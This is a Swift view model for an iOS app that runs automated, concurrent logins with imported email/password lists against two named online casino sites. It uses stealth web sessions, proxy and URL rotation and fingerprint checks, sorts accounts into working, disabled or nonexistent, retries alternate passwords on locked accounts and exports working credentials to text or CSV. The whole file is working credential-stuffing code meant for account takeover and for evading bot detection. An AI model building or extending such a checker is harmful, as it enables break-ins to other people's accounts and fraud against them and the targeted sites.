import Foundation
import Observation
import SwiftUI

@Observable
@MainActor
class LoginViewModel {
    var credentials: [LoginCredential] = []
    var attempts: [LoginAttempt] = []
    var isRunning: Bool = false
    var isPaused: Bool = false
    var isStopping: Bool = false
    var globalLogs: [PPSRLogEntry] = []
    var connectionStatus: ConnectionStatus = .disconnected
    var activeTestCount: Int = 0
    var maxConcurrency: Int = 8
    var debugMode: Bool = false
    var stealthEnabled: Bool = true
    var targetSite: LoginTargetSite = .joefortune
    var appearanceMode: AppearanceMode = .dark
    var testTimeout: TimeInterval = 45
    var showBatchResultPopup: Bool = false
    var lastBatchResult: BatchResult?
    var showUnusualFailureAlert: Bool = false
    var unusualFailureMessage: String = ""
    var consecutiveUnusualFailures: Int = 0
    var consecutiveConnectionFailures: Int = 0
    var debugScreenshots: [PPSRDebugScreenshot] = []
    var fingerprintPassRate: String { FingerprintValidationService.shared.formattedPassRate }
    var fingerprintAvgScore: Double { FingerprintValidationService.shared.averageScore }
    var fingerprintHistory: [FingerprintValidationService.FingerprintScore] { FingerprintValidationService.shared.scoreHistory }
    var lastFingerprintScore: FingerprintValidationService.FingerprintScore? { FingerprintValidationService.shared.lastScore }
    var dualSiteMode: Bool = false
    var savedCropRect: CGRect? = nil

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    let blacklistService = BlacklistService.shared
    let disabledCheckService = DisabledCheckService.shared

    var isIgnitionMode: Bool {
        get { urlRotation.isIgnitionMode }
        set {
            urlRotation.isIgnitionMode = newValue
            targetSite = newValue ? .ignition : .joefortune
            persistSettings()
        }
    }

    var effectiveColorScheme: ColorScheme? {
        if isIgnitionMode {
            return .dark
        }
        return appearanceMode.colorScheme
    }

    nonisolated enum AppearanceMode: String, CaseIterable, Sendable {
        case system = "System"
        case light = "Light"
        case dark = "Dark"

        var colorScheme: ColorScheme? {
            switch self {
            case .system: nil
            case .light: .light
            case .dark: .dark
            }
        }

        var icon: String {
            switch self {
            case .system: "circle.lefthalf.filled"
            case .light: "sun.max.fill"
            case .dark: "moon.fill"
            }
        }
    }

    nonisolated enum ConnectionStatus: String, Sendable {
        case disconnected = "Disconnected"
        case connecting = "Connecting"
        case connected = "Connected"
        case error = "Error"
    }

    private let engine = LoginAutomationEngine()
    private let secondaryEngine = LoginAutomationEngine()
    private let persistence = LoginPersistenceService.shared
    private let notifications = PPSRNotificationService.shared
    private var batchTask: Task<Void, Never>?
    private var secondaryBatchTask: Task<Void, Never>?

    init() {
        engine.onScreenshot = { [weak self] screenshot in
            self?.debugScreenshots.insert(screenshot, at: 0)
        }
        engine.onConnectionFailure = { [weak self] detail in
            self?.notifications.sendConnectionFailure(detail: detail)
        }
        engine.onUnusualFailure = { [weak self] detail in
            guard let self else { return }
            self.consecutiveUnusualFailures += 1
            if self.consecutiveUnusualFailures >= 2 {
                self.unusualFailureMessage = detail
                self.showUnusualFailureAlert = true
            }
        }
        engine.onLog = { [weak self] message, level in
            self?.log(message, level: level)
        }
        engine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
            self?.log("URL disabled after failures: \(urlString)", level: .warning)
        }
        engine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        engine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }

        secondaryEngine.onScreenshot = { [weak self] screenshot in
            self?.debugScreenshots.insert(screenshot, at: 0)
        }
        secondaryEngine.onLog = { [weak self] message, level in
            self?.log("[DUAL] \(message)", level: level)
        }
        secondaryEngine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
        }
        secondaryEngine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        secondaryEngine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }

        notifications.requestPermission()
        loadPersistedData()
    }

    private func loadPersistedData() {
        credentials = persistence.loadCredentials()
        if let settings = persistence.loadSettings() {
            if let site = LoginTargetSite(rawValue: settings.targetSite) {
                targetSite = site
            }
            maxConcurrency = settings.maxConcurrency
            debugMode = settings.debugMode
            if let mode = AppearanceMode(rawValue: settings.appearanceMode) {
                appearanceMode = mode
            }
            stealthEnabled = settings.stealthEnabled
            testTimeout = settings.testTimeout
        }
        loadCropRect()
        if !credentials.isEmpty {
            log("Restored \(credentials.count) credentials from storage")
        }
    }

    func persistCredentials() {
        persistence.saveCredentials(credentials)
    }

    func persistSettings() {
        persistence.saveSettings(
            targetSite: targetSite.rawValue,
            maxConcurrency: maxConcurrency,
            debugMode: debugMode,
            appearanceMode: appearanceMode.rawValue,
            stealthEnabled: stealthEnabled,
            testTimeout: testTimeout
        )
    }

    func saveCropRect(_ rect: CGRect) {
        savedCropRect = rect
        let dict: [String: Double] = [
            "x": rect.origin.x,
            "y": rect.origin.y,
            "w": rect.size.width,
            "h": rect.size.height,
        ]
        UserDefaults.standard.set(dict, forKey: "login_crop_rect_v1")
        log("Saved crop region: \(Int(rect.origin.x)),\(Int(rect.origin.y)) \(Int(rect.width))x\(Int(rect.height))")
    }

    func clearCropRect() {
        savedCropRect = nil
        UserDefaults.standard.removeObject(forKey: "login_crop_rect_v1")
        log("Cleared crop region")
    }

    private func loadCropRect() {
        guard let dict = UserDefaults.standard.dictionary(forKey: "login_crop_rect_v1"),
              let x = dict["x"] as? Double,
              let y = dict["y"] as? Double,
              let w = dict["w"] as? Double,
              let h = dict["h"] as? Double else { return }
        savedCropRect = CGRect(x: x, y: y, width: w, height: h)
    }

    func syncFromiCloud() {
        if let synced = persistence.syncFromiCloud() {
            let existingUsernames = Set(credentials.map(\.username))
            var added = 0
            for cred in synced where !existingUsernames.contains(cred.username) {
                credentials.append(cred)
                added += 1
            }
            if added > 0 {
                log("iCloud sync: merged \(added) new credentials", level: .success)
                persistCredentials()
            } else {
                log("iCloud sync: no new credentials found", level: .info)
            }
        }
    }

    var workingCredentials: [LoginCredential] { credentials.filter { $0.status == .working } }
    var noAccCredentials: [LoginCredential] { credentials.filter { $0.status == .noAcc } }
    var permDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .permDisabled } }
    var tempDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .tempDisabled } }
    var unsureCredentials: [LoginCredential] { credentials.filter { $0.status == .unsure } }
    var untestedCredentials: [LoginCredential] { credentials.filter { $0.status == .untested } }
    var testingCredentials: [LoginCredential] { credentials.filter { $0.status == .testing } }

    let tempDisabledService = TempDisabledCheckService.shared
    var activeAttempts: [LoginAttempt] { attempts.filter { !$0.status.isTerminal } }
    var completedAttempts: [LoginAttempt] { attempts.filter { $0.status == .completed } }
    var failedAttempts: [LoginAttempt] { attempts.filter { $0.status == .failed } }

    func getNextTestURL() -> URL {
        if let rotatedURL = urlRotation.nextURL() {
            return rotatedURL
        }
        return targetSite.url
    }

    func getNextTestURL(forSite site: LoginTargetSite) -> URL {
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let url = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    func testConnection() async {
        connectionStatus = .connecting
        let testURL = getNextTestURL()
        log("Testing connection to \(testURL.host ?? "unknown")...")

        var request = URLRequest(url: testURL, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: 15)
        request.httpMethod = "GET"
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15", forHTTPHeaderField: "User-Agent")

        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            if let http = response as? HTTPURLResponse {
                if http.statusCode >= 200 && http.statusCode < 400 {
                    connectionStatus = .connected
                    consecutiveConnectionFailures = 0
                    urlRotation.reportSuccess(urlString: testURL.absoluteString)
                    log("Connected — HTTP \(http.statusCode) (\(data.count) bytes)", level: .success)

                    let session = LoginSiteWebSession(targetURL: testURL)
                    session.stealthEnabled = stealthEnabled
                    session.setUp()
                    defer { session.tearDown() }

                    let loaded = await session.loadPage(timeout: 20)
                    if loaded {
                        let verification = await session.verifyLoginFieldsExist()
                        if verification.found == 2 {
                            log("WebView verification: both login fields found", level: .success)
                        } else {
                            log("WebView verification: \(verification.found)/2 fields. Missing: \(verification.missing.joined(separator: ", "))", level: .warning)
                        }
                    } else {
                        log("WebView page load failed — HTTP works but WKWebView could not render", level: .warning)
                    }
                } else {
                    connectionStatus = .error
                    urlRotation.reportFailure(urlString: testURL.absoluteString)
                    log("Connection failed — HTTP \(http.statusCode)", level: .error)
                }
            }
        } catch {
            connectionStatus = .error
            urlRotation.reportFailure(urlString: testURL.absoluteString)
            log("Connection failed: \(error.localizedDescription)", level: .error)
        }
    }

    func smartImportCredentials(_ input: String) {
        let parsed = LoginCredential.smartParse(input)
        let lines = input.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }

        if parsed.isEmpty && !lines.isEmpty {
            for line in lines {
                log("Could not parse: \(line)", level: .warning)
            }
            return
        }

        let permDisabledUsernames = Set(permDisabledCredentials.map(\.username))

        var added = 0
        var skippedBlacklist = 0
        for cred in parsed {
            if permDisabledUsernames.contains(cred.username) {
                log("Skipped perm disabled: \(cred.username)", level: .warning)
                continue
            }
            if blacklistService.autoExcludeBlacklist && blacklistService.isBlacklisted(cred.username) {
                skippedBlacklist += 1
                continue
            }
            let isDuplicate = credentials.contains { $0.username == cred.username }
            if isDuplicate {
                log("Skipped duplicate: \(cred.username)", level: .warning)
            } else {
                credentials.append(cred)
                added += 1
            }
        }

        if skippedBlacklist > 0 {
            log("Skipped \(skippedBlacklist) blacklisted credential(s)", level: .warning)
        }

        if parsed.count > 0 {
            log("Smart import: \(added) added from \(parsed.count) parsed (\(lines.count) lines)", level: .success)
        }
        persistCredentials()
    }

    func deleteCredential(_ cred: LoginCredential) {
        credentials.removeAll { $0.id == cred.id }
        log("Removed credential: \(cred.username)")
        persistCredentials()
    }

    func restoreCredential(_ cred: LoginCredential) {
        cred.status = .untested
        log("Restored \(cred.username) to untested")
        persistCredentials()
    }

    func purgePermDisabledCredentials() {
        let count = permDisabledCredentials.count
        credentials.removeAll { $0.status == .permDisabled }
        log("Purged \(count) perm disabled credential(s)")
        persistCredentials()
    }

    func purgeNoAccCredentials() {
        let count = noAccCredentials.count
        credentials.removeAll { $0.status == .noAcc }
        log("Purged \(count) no-acc credential(s)")
        persistCredentials()
    }

    func purgeUnsureCredentials() {
        let count = unsureCredentials.count
        credentials.removeAll { $0.status == .unsure }
        log("Purged \(count) unsure credential(s)")
        persistCredentials()
    }

    func testSingleCredential(_ cred: LoginCredential) {
        guard !isRunning || activeTestCount < maxConcurrency else {
            log("Max concurrency reached", level: .warning)
            return
        }

        cred.status = .testing
        let attempt = LoginAttempt(credential: cred, sessionIndex: activeTestCount + 1)
        attempts.insert(attempt, at: 0)

        Task {
            configureEngine()
            isRunning = true
            activeTestCount += 1
            let testURL = getNextTestURL()
            let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
            activeTestCount -= 1
            handleOutcome(outcome, credential: cred, attempt: attempt)
            if activeTestCount == 0 { isRunning = false }
            persistCredentials()
        }
    }

    private func configureEngine() {
        engine.debugMode = debugMode
        engine.stealthEnabled = stealthEnabled
    }

    private func handleOutcome(_ outcome: LoginOutcome, credential: LoginCredential, attempt: LoginAttempt) {
        let duration = attempt.duration ?? 0

        switch outcome {
        case .success:
            credential.recordResult(success: true, duration: duration)
            log("\(credential.username) — LOGIN SUCCESS (\(attempt.formattedDuration))", level: .success)
            consecutiveUnusualFailures = 0

        case .noAcc:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "no account")
            log("\(credential.username) — NO ACC: incorrect credentials", level: .error)
            consecutiveUnusualFailures = 0
            if blacklistService.autoBlacklistNoAcc {
                blacklistService.addToBlacklist(credential.username, reason: "Auto: no account")
                log("\(credential.username) — auto-added to blacklist (no acc)", level: .warning)
            }

        case .permDisabled:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "permanently disabled")
            log("\(credential.username) — PERM DISABLED", level: .error)
            consecutiveUnusualFailures = 0

        case .tempDisabled:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "temporarily disabled")
            log("\(credential.username) — TEMP DISABLED (moved to temp disabled section)", level: .warning)
            consecutiveUnusualFailures = 0

        case .redBannerError:
            credential.status = .untested
            requeueCredentialToBottom(credential)
            log("\(credential.username) — red banner error detected, requeued to bottom", level: .warning)

        case .unsure, .timeout, .connectionFailure:
            credential.status = .untested
            let reason: String
            switch outcome {
            case .timeout:
                reason = "timeout (45s combined)"
                requeueCredentialToBottom(credential)
            case .connectionFailure:
                reason = "connection failure"
                consecutiveConnectionFailures += 1
                requeueCredentialToBottom(credential)
            default:
                reason = "unsure result"
                requeueCredentialToBottom(credential)
            }
            log("\(credential.username) — requeued to bottom (\(reason))", level: .warning)
        }
    }

    func testAllUntested() {
        let credsToTest = untestedCredentials
        guard !credsToTest.isEmpty else {
            log("No untested credentials in queue", level: .warning)
            return
        }

        isPaused = false
        isStopping = false

        if dualSiteMode {
            log("Starting DUAL-SITE batch: \(credsToTest.count) creds, Joe + Ignition simultaneously")
            testDualSite(credsToTest)
        } else {
            log("Starting batch test: \(credsToTest.count) credentials, max \(maxConcurrency) concurrent, stealth: \(stealthEnabled ? "ON" : "OFF")")
            testSingleSiteBatch(credsToTest)
        }
    }

    private func testSingleSiteBatch(_ credsToTest: [LoginCredential]) {
        isRunning = true
        var batchWorking = 0
        var batchDead = 0
        var batchRequeued = 0

        batchTask = Task {
            configureEngine()
            await withTaskGroup(of: Void.self) { group in
                var running = 0

                for cred in credsToTest {
                    if isStopping { break }

                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }

                    if isStopping { break }

                    if running >= maxConcurrency {
                        await group.next()
                        running -= 1
                    }

                    running += 1
                    cred.status = .testing
                    let sessionIdx = running

                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
                    attempts.insert(attempt, at: 0)
                    activeTestCount += 1

                    let testURL = getNextTestURL()

                    group.addTask { [engine, testTimeout] in
                        let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                        await MainActor.run {
                            self.activeTestCount -= 1
                            self.handleOutcome(outcome, credential: cred, attempt: attempt)

                            switch outcome {
                            case .success: batchWorking += 1
                            case .noAcc, .permDisabled, .tempDisabled: batchDead += 1
                            case .unsure, .timeout, .connectionFailure, .redBannerError: batchRequeued += 1
                            }

                            self.persistCredentials()
                        }
                    }
                }

                await group.waitForAll()
            }

            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func testDualSite(_ credsToTest: [LoginCredential]) {
        isRunning = true
        var batchWorking = 0
        var batchDead = 0
        var batchRequeued = 0

        let halfConcurrency = max(1, maxConcurrency / 2)

        batchTask = Task {
            configureEngine()
            secondaryEngine.debugMode = debugMode
            secondaryEngine.stealthEnabled = stealthEnabled

            await withTaskGroup(of: Void.self) { group in
                var running = 0

                for cred in credsToTest {
                    if isStopping { break }

                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    if isStopping { break }

                    if running >= maxConcurrency {
                        await group.next()
                        running -= 1
                    }

                    running += 1
                    cred.status = .testing
                    let sessionIdx = running

                    let useIgnition = running > halfConcurrency
                    let targetEngine = useIgnition ? secondaryEngine : engine
                    let testURL = useIgnition ? getNextTestURL(forSite: .ignition) : getNextTestURL(forSite: .joefortune)
                    let siteLabel = useIgnition ? "IGN" : "JOE"

                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
                    attempts.insert(attempt, at: 0)
                    activeTestCount += 1

                    group.addTask { [testTimeout] in
                        let outcome = await targetEngine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                        await MainActor.run {
                            self.activeTestCount -= 1
                            attempt.logs.insert(PPSRLogEntry(message: "[\(siteLabel)] Tested on \(testURL.host ?? "")", level: .info), at: 0)
                            self.handleOutcome(outcome, credential: cred, attempt: attempt)

                            switch outcome {
                            case .success: batchWorking += 1
                            case .noAcc, .permDisabled, .tempDisabled: batchDead += 1
                            case .unsure, .timeout, .connectionFailure, .redBannerError: batchRequeued += 1
                            }

                            self.persistCredentials()
                        }
                    }
                }

                await group.waitForAll()
            }

            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func finalizeBatch(working: Int, dead: Int, requeued: Int) {
        let result = BatchResult(working: working, dead: dead, requeued: requeued, total: working + dead + requeued)
        lastBatchResult = result
        isRunning = false
        isPaused = false

        let stoppedEarly = isStopping
        isStopping = false

        if stoppedEarly {
            log("Batch stopped: \(working) working, \(dead) dead, \(requeued) requeued", level: .warning)
        } else {
            log("Batch complete: \(working) working, \(dead) dead, \(requeued) requeued", level: .success)
        }

        showBatchResultPopup = true
        notifications.sendBatchComplete(working: working, dead: dead, requeued: requeued)
        persistCredentials()
    }

    func pauseQueue() {
        isPaused = true
        log("Queue paused — completing current tests then holding", level: .warning)
    }

    func resumeQueue() {
        isPaused = false
        log("Queue resumed", level: .info)
    }

    func stopQueue() {
        isStopping = true
        isPaused = false
        log("Stopping queue — completing current tests then stopping...", level: .warning)
    }

    func stopAfterCurrent() {
        isStopping = true
        isPaused = false
        log("Stopping after current batch due to unusual failures...", level: .warning)
    }

    func retestCredential(_ cred: LoginCredential) {
        cred.status = .untested
        testSingleCredential(cred)
    }

    func clearHistory() {
        attempts.removeAll(where: { $0.status.isTerminal })
        log("Cleared completed attempts")
    }

    func clearAll() {
        attempts.removeAll()
        globalLogs.removeAll()
    }

    func exportWorkingCredentials() -> String {
        workingCredentials.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentials(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        return creds.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentialsCSV(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        var csv = "Email,Password,Status,Tests,Success Rate\n"
        for cred in creds {
            csv += "\(cred.username),\(cred.password),\(cred.status.rawValue),\(cred.totalTests),\(String(format: "%.0f%%", cred.successRate * 100))\n"
        }
        return csv
    }

    nonisolated enum CredentialExportFilter: String, CaseIterable, Sendable {
        case all = "All"
        case untested = "Untested"
        case working = "Working"
        case tempDisabled = "Temp Disabled"
        case permDisabled = "Perm Disabled"
        case noAcc = "No Acc"
        case unsure = "Unsure"

        var id: String { rawValue }
    }

    func clearDebugScreenshots() {
        let count = debugScreenshots.count
        debugScreenshots.removeAll()
        log("Cleared \(count) debug screenshots")
    }

    func runTempDisabledPasswordCheck() {
        tempDisabledService.runPasswordCheck(
            credentials: credentials,
            getURL: { [weak self] in self?.getNextTestURL() ?? URL(string: "https://example.com")! },
            persistCredentials: { [weak self] in self?.persistCredentials() },
            onLog: { [weak self] message, level in self?.log(message, level: level) }
        )
    }

    func assignPasswordsToTempDisabled(_ cred: LoginCredential, passwords: [String]) {
        cred.assignedPasswords = passwords
        cred.nextPasswordIndex = 0
        log("Assigned \(passwords.count) passwords to \(cred.username)")
        persistCredentials()
    }

    func runDisabledCheck(emails: [String]) {
        disabledCheckService.runCheck(emails: emails) { [weak self] results in
            guard let self else { return }
            let disabled = results.filter(\.isDisabled)
            if !disabled.isEmpty {
                self.log("Disabled check complete: \(disabled.count) perm disabled found", level: .warning)
            } else {
                self.log("Disabled check complete: no disabled accounts found", level: .success)
            }
        }
    }

    func applyDisabledCheckResults() {
        let disabledEmails = Set(disabledCheckService.disabledResults.map(\.email))
        var updated = 0
        for cred in credentials {
            if disabledEmails.contains(cred.username.lowercased()) && cred.status != .permDisabled {
                cred.status = .permDisabled
                updated += 1
            }
        }
        if updated > 0 {
            log("Updated \(updated) credentials to perm disabled from check results", level: .warning)
            persistCredentials()
        }
    }

    func addDisabledToBlacklist() {
        let emails = disabledCheckService.disabledResults.map(\.email)
        blacklistService.addMultipleToBlacklist(emails, reason: "Disabled check")
        log("Added \(emails.count) disabled accounts to blacklist", level: .success)
    }

    func correctResult(for screenshot: PPSRDebugScreenshot, override: UserResultOverride) {
        screenshot.userOverride = override

        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Correction: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }

        let isPass = override == .markedPass
        if isPass {
            cred.status = .working
            if let lastResult = cred.testResults.first, !lastResult.success {
                let corrected = LoginTestResult(success: true, duration: lastResult.duration, errorMessage: nil, responseDetail: "User corrected to PASS", timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        } else {
            cred.status = .noAcc
            if let lastResult = cred.testResults.first, lastResult.success {
                let corrected = LoginTestResult(success: false, duration: lastResult.duration, errorMessage: "User corrected to FAIL", responseDetail: nil, timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        }

        let label = isPass ? "PASS" : "FAIL"
        log("Debug correction: \(cred.username) marked as \(label) by user", level: isPass ? .success : .error)
        persistCredentials()
    }

    func resetScreenshotOverride(_ screenshot: PPSRDebugScreenshot) {
        screenshot.userOverride = .none
        log("Reset override for screenshot at \(screenshot.formattedTime)")
    }

    func requeueCredentialFromScreenshot(_ screenshot: PPSRDebugScreenshot) {
        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Requeue: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }
        cred.status = .untested
        log("Requeued \(cred.username) for retesting", level: .info)
        persistCredentials()
    }

    func screenshotsForCredential(_ credId: String) -> [PPSRDebugScreenshot] {
        debugScreenshots.filter { $0.cardId == credId }
    }

    func screenshotsForAttempt(_ attempt: LoginAttempt) -> [PPSRDebugScreenshot] {
        let ids = Set(attempt.screenshotIds)
        return debugScreenshots.filter { ids.contains($0.id) }
    }

    private func requeueCredentialToBottom(_ credential: LoginCredential) {
        if let idx = credentials.firstIndex(where: { $0.id == credential.id }) {
            credentials.remove(at: idx)
            credentials.append(credential)
        }
    }

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        globalLogs.insert(PPSRLogEntry(message: message, level: level), at: 0)
    }
}
